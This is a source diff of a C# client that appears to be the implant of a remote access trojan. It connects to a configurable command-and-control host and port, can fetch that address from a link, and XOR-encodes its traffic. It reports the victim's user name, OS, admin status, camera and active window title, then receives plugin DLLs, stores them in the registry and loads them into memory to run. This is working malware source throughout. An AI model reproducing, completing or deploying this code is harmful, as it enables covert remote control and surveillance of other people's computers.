@@ -1,5 +1,4 @@
 ﻿using MessagePack;
-using Microsoft.VisualBasic;
 using Microsoft.VisualBasic.Devices;
 using System;
 using System.Collections.Generic;
@@ -7,37 +6,40 @@ using System.Diagnostics;
 using System.IO;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
-using System.Runtime.InteropServices.ComTypes;
 using System.Security.Cryptography;
 using System.Security.Principal;
 using System.Text;
 using System.Threading;
+using System.Runtime.InteropServices.ComTypes;
+using EXCEPINFO = System.Runtime.InteropServices.ComTypes.EXCEPINFO;
+using DISPPARAMS = System.Runtime.InteropServices.ComTypes.DISPPARAMS;
+using System.Net;
+using System.Linq;
+using System.Reflection;
 using System.Windows.Forms;
+using Timer = System.Threading.Timer;
+using Microsoft.Win32;
 
 namespace Client
 {
     class Program
     {
-        public static Socket Client { get; set; }
-        private static byte[] Buffer { get; set; }
-        private static long Buffersize { get; set; }
-        private static bool BufferRecevied { get; set; }
-        private static System.Threading.Timer Tick { get; set; }
-        private static MemoryStream MS { get; set; }
-        private static object SendSync { get; set; }
-
-
         #region Setting
-        public static readonly string IP = "127.0.0.1";
+        public static readonly string Link = null;
+        public static readonly string Host = "127.0.0.1";        
         public static readonly int Port = 8848;
         public static readonly string Version = "0.0.1";
         public static readonly string Mutex = "qwqdanchun";
         public static readonly string Group = "Default";
         public static readonly string XorKey = "qwqdanchun";
+
+        public static string HWID = "";
         #endregion
 
         static void Main(string[] args)
         {
+            HWID = GetHWID();
+            CreateMutex();
             InitializeClient();
             while (true)
             {
@@ -46,45 +48,340 @@ namespace Client
         }
 
         #region Socket
-        public static void InitializeClient()
+
+        public static Socket TcpClient { get; set; } //Main socket
+        private static byte[] Buffer { get; set; } //Socket buffer
+        private static long HeaderSize { get; set; } //Recevied size
+        private static long Offset { get; set; } // Buffer location
+        private static Timer KeepAlive { get; set; } //Send Performance
+        public static bool IsConnected { get; set; } //Check socket status
+        private static object SendSync { get; } = new object(); //Sync send
+        private static Timer Ping { get; set; } //Send ping interval
+        public static int Interval { get; set; } //ping value
+        public static bool ActivatePong { get; set; }
+
+        public static List<MsgPack> Packs = new List<MsgPack>();
+
+        public static void InitializeClient() //Connect & reconnect
         {
             try
             {
-                Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
+
+                TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                 {
                     ReceiveBufferSize = 50 * 1024,
                     SendBufferSize = 50 * 1024,
-                    ReceiveTimeout = -1,
-                    SendTimeout = -1,
                 };
-                Client.Connect(IP, Port);
-                Debug.WriteLine("Connected!");
-                Buffer = new byte[1];
-                Buffersize = 0;
-                BufferRecevied = false;
-                MS = new MemoryStream();
-                SendSync = new object();
-                BeginSend(SendInfo());
-                TimerCallback T = Ping;
-                Tick = new System.Threading.Timer(T, null, new Random().Next(30 * 1000, 60 * 1000), new Random().Next(30 * 1000, 60 * 1000));
-                Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
+
+                if (Link == null)
+                {
+                    if (IsValidDomainName(Host))
+                    {
+                        IPAddress[] addresslist = Dns.GetHostAddresses(Host);
+
+                        foreach (IPAddress theaddress in addresslist)
+                        {
+                            try
+                            {
+                                TcpClient.Connect(theaddress, Port);
+                                if (TcpClient.Connected) break;
+                            }
+                            catch { }
+                        }
+                    }
+                    else
+                    {
+                        TcpClient.Connect(Host, Port);
+                    }
+                }
+                else
+                {
+                    using (WebClient wc = new WebClient())
+                    {
+                        NetworkCredential networkCredential = new NetworkCredential("", "");
+                        wc.Credentials = networkCredential;
+                        string resp = wc.DownloadString(Link);
+                        string[] spl = resp.Split(new[] { ":" }, StringSplitOptions.None);
+                        TcpClient.Connect(spl[0], Convert.ToInt32(spl[new Random().Next(1, spl.Length)]));
+                    }
+                }
+
+                if (TcpClient.Connected)
+                {
+                    IsConnected = true;
+                    HeaderSize = 4;
+                    Buffer = new byte[HeaderSize];
+                    Offset = 0;
+                    Send(SendInfo());
+                    Interval = 0;
+                    ActivatePong = false;
+                    KeepAlive = new Timer(new TimerCallback(KeepAlivePacket), null, new Random().Next(10 * 1000, 15 * 1000), new Random().Next(10 * 1000, 15 * 1000));
+                    Ping = new Timer(new TimerCallback(Pong), null, 1, 1);
+                    TcpClient.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
+                }
+                else
+                {
+                    Reconnect();
+                    return;
+                }
             }
             catch
             {
-                Debug.WriteLine("Disconnected!");
                 Thread.Sleep(new Random().Next(1 * 1000, 6 * 1000));
                 Reconnect();
+                return;
             }
         }
+
+        private static bool IsValidDomainName(string name)
+        {
+            return Uri.CheckHostName(name) != UriHostNameType.Unknown;
+        }
+
+        public static void Reconnect()
+        {
+            if (TcpClient.Connected) return;
+
+
+            try
+            {
+                Ping?.Dispose();
+                KeepAlive?.Dispose();
+                if (TcpClient != null)
+                {
+                    TcpClient.Close();
+                    TcpClient.Dispose();
+                }
+            }
+            catch { }
+            InitializeClient();
+            IsConnected = false;
+        }
+
+        public static void ReadServertData(IAsyncResult ar) //Socket read/recevie
+        {
+            try
+            {
+                if (!TcpClient.Connected || !IsConnected)
+                {
+                    Reconnect();
+                    return;
+                }
+                int recevied = TcpClient.EndReceive(ar);
+                if (recevied > 0)
+                {
+                    Offset += recevied;
+                    HeaderSize -= recevied;
+                    if (HeaderSize == 0)
+                    {
+                        HeaderSize = BitConverter.ToInt32(Buffer, 0);
+                        //Debug.WriteLine("/// Client Buffersize " + HeaderSize.ToString() + " Bytes  ///");
+                        if (HeaderSize > 0)
+                        {
+                            Offset = 0;
+                            Buffer = new byte[HeaderSize];
+                            while (HeaderSize > 0)
+                            {
+                                int rc = TcpClient.Receive(Buffer, 0, Buffer.Length, SocketFlags.None);
+                                if (rc <= 0)
+                                {
+                                    Reconnect();
+                                    return;
+                                }
+                                Offset += rc;
+                                HeaderSize -= rc;
+                                if (HeaderSize < 0)
+                                {
+                                    Reconnect();
+                                    return;
+                                }
+                            }
+                            Thread thread = new Thread(new ParameterizedThreadStart(Read));
+                            thread.Start(Buffer);
+                            Offset = 0;
+                            HeaderSize = 4;
+                            Buffer = new byte[HeaderSize];
+                        }
+                        else
+                        {
+                            HeaderSize = 4;
+                            Buffer = new byte[HeaderSize];
+                            Offset = 0;
+                        }
+                    }
+                    else if (HeaderSize < 0)
+                    {
+                        Reconnect();
+                        return;
+                    }
+                    TcpClient.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
+                }
+                else
+                {
+                    Reconnect();
+                    return;
+                }
+            }
+            catch
+            {
+                Reconnect();
+                return;
+            }
+        }
+
+        public static void Send(byte[] msg)
+        {
+            lock (SendSync)
+            {
+                try
+                {
+                    if (!IsConnected)
+                    {
+                        return;
+                    }
+
+                    byte[] buffer = Xor((byte[])msg);
+                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);
+
+                    TcpClient.Poll(-1, SelectMode.SelectWrite);
+                    TcpClient.Send(buffersize, 0, buffersize.Length, SocketFlags.None);
+                    TcpClient.Send(buffer, 0, buffer.Length, SocketFlags.None);
+                }
+                catch
+                {
+                    Reconnect();
+                    return;
+                }
+            }
+        }
+
+        public static void KeepAlivePacket(object obj)
+        {
+            try
+            {
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "Ping";
+                msgpack.ForcePathObject("Message").AsString = GetActiveWindowTitle();
+                Send(msgpack.Encode2Bytes());
+                GC.Collect();
+                ActivatePong = true;
+            }
+            catch { }
+        }
+
+        private static void Pong(object obj)
+        {
+            try
+            {
+                if (ActivatePong && IsConnected)
+                {
+                    Interval++;
+                }
+            }
+            catch { }
+        }
+
+
+        public static void Read(object data)
+        {
+            try
+            {
+                MsgPack unpack_msgpack = new MsgPack();
+                unpack_msgpack.DecodeFromBytes(Xor((byte[])data));
+                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
+                {
+                    case "Pong": //send interval value to server
+                        {
+                            ActivatePong = false;
+                            MsgPack msgPack = new MsgPack();
+                            msgPack.ForcePathObject("Packet").SetAsString("Pong");
+                            msgPack.ForcePathObject("Message").SetAsInteger(Interval);
+                            Send(msgPack.Encode2Bytes());
+                            Interval = 0;
+                            break;
+                        }
+
+                    case "plugin": // run plugin in memory
+                        {
+                            try
+                            {
+                                if (GetValue(unpack_msgpack.ForcePathObject("Dll").AsString) == null) // check if plugin is installed
+                                {
+                                    Packs.Add(unpack_msgpack); //save it for later
+                                    MsgPack msgPack = new MsgPack();
+                                    msgPack.ForcePathObject("Packet").SetAsString("sendPlugin");
+                                    msgPack.ForcePathObject("Hashes").SetAsString(unpack_msgpack.ForcePathObject("Dll").AsString);
+                                    Send(msgPack.Encode2Bytes());
+                                }
+                                else
+                                    Invoke(unpack_msgpack);
+                            }
+                            catch (Exception ex)
+                            {
+                                Error(ex.Message);
+                            }
+                            break;
+                        }
+
+                    case "savePlugin": // save plugin
+                        {
+                            SetValue(unpack_msgpack.ForcePathObject("Hash").AsString, unpack_msgpack.ForcePathObject("Dll").GetAsBytes());
+                            Debug.WriteLine("plugin saved");
+                            foreach (MsgPack msgPack in Packs.ToList())
+                            {
+                                if (msgPack.ForcePathObject("Dll").AsString == unpack_msgpack.ForcePathObject("Hash").AsString)
+                                {
+                                    Invoke(msgPack);
+                                    Packs.Remove(msgPack);
+                                }
+                            }
+                            break;
+                        }
+                }
+            }
+            catch (Exception ex)
+            {
+                Error(ex.Message);
+            }
+        }
+
+        private static void Invoke(MsgPack unpack_msgpack)
+        {
+            Assembly assembly = AppDomain.CurrentDomain.Load(Zip.Decompress(GetValue(unpack_msgpack.ForcePathObject("Dll").AsString)));
+            Type type = assembly.GetType("Plugin.Plugin");
+            dynamic instance = Activator.CreateInstance(type);
+            instance.Run(TcpClient, HWID, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), currentApp);
+            Received();
+        }
+
+        private static void Received() //reset client forecolor
+        {
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Packet").AsString = "Received";
+            Send(msgpack.Encode2Bytes());
+            Thread.Sleep(1000);
+        }
+
+        public static void Error(string ex) //send to logs
+        {
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Packet").AsString = "Error";
+            msgpack.ForcePathObject("Error").AsString = ex;
+            Send(msgpack.Encode2Bytes());
+        }
+
+        #endregion
+
+        #region
 
         public static byte[] SendInfo()
         {
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
-            msgpack.ForcePathObject("HWID").AsString = HWID();
+            msgpack.ForcePathObject("HWID").AsString = HWID;
             msgpack.ForcePathObject("User").AsString = Environment.UserName;
             msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.Replace("Microsoft", null) + " " + (Environment.Is64BitOperatingSystem? "64bit":"32bit");
-            msgpack.ForcePathObject("Camera").AsString = havecamera().ToString();
+            msgpack.ForcePathObject("Camera").SetAsBoolean(havecamera());
             msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
             msgpack.ForcePathObject("Version").AsString = Version;
             msgpack.ForcePathObject("Admin").AsString = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString().ToLower().Replace("true", "Admin").Replace("false", "User");
@@ -121,7 +418,7 @@ namespace Client
         #endregion
 
         #region HWID
-        public static string HWID()
+        public static string GetHWID()
         {
             try
             {
@@ -196,7 +493,7 @@ namespace Client
                 [In, MarshalAs(UnmanagedType.U4)] int lcid, [Out, MarshalAs(UnmanagedType.LPArray)] int[] rgDispId);
             [PreserveSig]
             int Invoke(int dispIdMember, [In] ref Guid riid, [In, MarshalAs(UnmanagedType.U4)] int lcid, [In, MarshalAs(UnmanagedType.U4)] int dwFlags,
-                [Out, In] System.Runtime.InteropServices.DISPPARAMS pDispParams, [Out] out object pVarResult, [Out, In] System.Runtime.InteropServices.EXCEPINFO pExcepInfo, [Out, MarshalAs(UnmanagedType.LPArray)] IntPtr[] pArgErr);
+                [Out, In] DISPPARAMS pDispParams, [Out] out object pVarResult, [Out, In] EXCEPINFO pExcepInfo, [Out, MarshalAs(UnmanagedType.LPArray)] IntPtr[] pArgErr);
             #endregion
 
             int get_ProductName(out string pVal);
@@ -216,7 +513,7 @@ namespace Client
                 [In, MarshalAs(UnmanagedType.U4)] int lcid, [Out, MarshalAs(UnmanagedType.LPArray)] int[] rgDispId);
             [PreserveSig]
             int Invoke(int dispIdMember, [In] ref Guid riid, [In, MarshalAs(UnmanagedType.U4)] int lcid, [In, MarshalAs(UnmanagedType.U4)] int dwFlags,
-                [Out, In] System.Runtime.InteropServices.DISPPARAMS pDispParams, [Out] out object pVarResult, [Out, In] System.Runtime.InteropServices.EXCEPINFO pExcepInfo, [Out, MarshalAs(UnmanagedType.LPArray)] IntPtr[] pArgErr);
+                [Out, In] DISPPARAMS pDispParams, [Out] out object pVarResult, [Out, In] EXCEPINFO pExcepInfo, [Out, MarshalAs(UnmanagedType.LPArray)] IntPtr[] pArgErr);
             #endregion
 
             int Initialize(uint provider);
@@ -317,148 +614,6 @@ namespace Client
 
         #endregion
 
-        public static void Reconnect()
-        {
-            if (Client.Connected) return;
-
-            Tick?.Dispose();
-
-            try
-            {
-                if (Client != null)
-                {
-                    Client.Close();
-                    Client.Dispose();
-                }
-            }
-            catch { }
-
-            MS?.Dispose();
-
-            InitializeClient();
-        }
-
-
-        public static void ReadServertData(IAsyncResult ar)
-        {
-            try
-            {
-                if (Client.Connected == false)
-                {
-                    Reconnect();
-                    return;
-                }
-
-                int Recevied = Client.EndReceive(ar);
-
-                if (Recevied > 0)
-                {
-
-                    if (BufferRecevied == false)
-                    {
-                        if (Buffer[0] == 0)
-                        {
-                            Buffersize = Convert.ToInt64(Encoding.UTF8.GetString(MS.ToArray()));
-                            MS.Dispose();
-                            MS = new MemoryStream();
-                            if (Buffersize > 0)
-                            {
-                                Buffer = new byte[Buffersize - 1];
-                                BufferRecevied = true;
-                            }
-                        }
-                        else
-                        {
-                            MS.Write(Buffer, 0, Buffer.Length);
-                        }
-                    }
-                    else
-                    {
-                        MS.Write(Buffer, 0, Recevied);
-                        if (MS.Length == Buffersize)
-                        {
-                            ThreadPool.QueueUserWorkItem(Read, MS.ToArray());
-                            MS.Dispose();
-                            MS = new MemoryStream();
-                            Buffer = new byte[1];
-                            Buffersize = 0;
-                            BufferRecevied = false;
-                        }
-                        else
-                        {
-                            Buffer = new byte[Buffersize - MS.Length];
-                        }
-                    }
-                    Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
-                }
-                else
-                {
-                    Reconnect();
-                }
-            }
-            catch
-            {
-                Reconnect();
-            }
-        }
-
-        public static void Read(object Data)
-        {
-            try
-            {
-                MsgPack unpack_msgpack = new MsgPack();
-                unpack_msgpack.DecodeFromBytes(Xor((byte[])Data));
-                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
-                {
-
-                    case "Ping":
-                        {
-                            Debug.WriteLine("Server Pinged me " + unpack_msgpack.ForcePathObject("Message").AsString);
-                        }
-                        break;
-                }
-            }
-            catch { }
-        }
-
-        public static void Ping(object obj)
-        {
-            try
-            {
-                MsgPack msgpack = new MsgPack();
-                msgpack.ForcePathObject("Packet").AsString = "Ping";
-                msgpack.ForcePathObject("Message").AsString = DateTime.Now.ToLongTimeString().ToString();
-                BeginSend(msgpack.Encode2Bytes());
-            }
-            catch { }
-        }
-
-        public static void BeginSend(byte[] Msgs)
-        {
-            lock (SendSync)
-            {
-                if (Client.Connected)
-                {
-                    try
-                    {
-                        using (MemoryStream MS = new MemoryStream())
-                        {
-                            byte[] buffer = Xor(Msgs);
-                            byte[] buffersize = Encoding.UTF8.GetBytes(buffer.Length.ToString() + Strings.ChrW(0));
-                            MS.Write(buffersize, 0, buffersize.Length);
-                            MS.Write(buffer, 0, buffer.Length);
-
-                            Client.Poll(-1, SelectMode.SelectWrite);
-                            Client.BeginSend(MS.ToArray(), 0, (int)(MS.Length), SocketFlags.None, EndSend, null);
-                        }
-                    }
-                    catch
-                    {
-                        Reconnect();
-                    }
-                }
-            }
-        }
 
         static byte[] Xor(byte[] buffer)
         {
@@ -479,17 +634,7 @@ namespace Client
             return newByte;
         }
 
-        public static void EndSend(IAsyncResult ar)
-        {
-            try
-            {
-                Client.EndSend(ar);
-            }
-            catch
-            {
-                Reconnect();
-            }
-        }
+        
 
         #endregion
 
@@ -508,6 +653,42 @@ namespace Client
                 currentApp.Close();
                 currentApp = null;
             }
+        }
+        #endregion
+
+        #region Helper
+        public static byte[] GetValue(string value)
+        {
+            try
+            {
+                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\" + HWID))
+                {
+                    object o = key.GetValue(value);
+                    return (byte[])o;
+                }
+            }
+            catch (Exception ex)
+            {
+                Error(ex.Message);
+            }
+            return null;
+        }
+
+        public static bool SetValue(string name, byte[] value)
+        {
+            try
+            {
+                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\" + HWID, RegistryKeyPermissionCheck.ReadWriteSubTree))
+                {
+                    key.SetValue(name, value, RegistryValueKind.Binary);
+                    return true;
+                }
+            }
+            catch (Exception ex)
+            {
+                Error(ex.Message);
+            }
+            return false;
         }
         #endregion
     }
